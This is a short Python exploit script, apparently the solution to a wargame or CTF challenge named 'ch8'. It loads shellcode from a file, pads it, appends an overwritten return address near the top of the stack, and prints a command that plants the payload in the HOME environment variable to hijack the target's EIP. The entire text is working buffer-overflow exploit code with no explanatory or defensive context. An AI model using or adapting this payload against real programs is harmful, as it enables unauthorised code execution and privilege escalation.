import struct
import sys

with open('shell.bin', 'rb') as f:
    shellcode = f.read()

s = shellcode.ljust(128, b'\xcc')
# pad for other env vars
s += b'A' * 128 * 3
# pad for stuff before eip
s += b'B' * 32

# put the address from ./env HOME ./ch8 here!
stack_region_end = 0xc0000000 

# return addr (eip)
s += struct.pack('<I', stack_region_end - 128 * 4 - 4)

# mov dest
s += struct.pack('<I', stack_region_end - 128 * 4 - 4)

escaped = repr(s)[1:]
print(f'HOME="$(echo -ne {escaped})" USERNAME= ./ch8')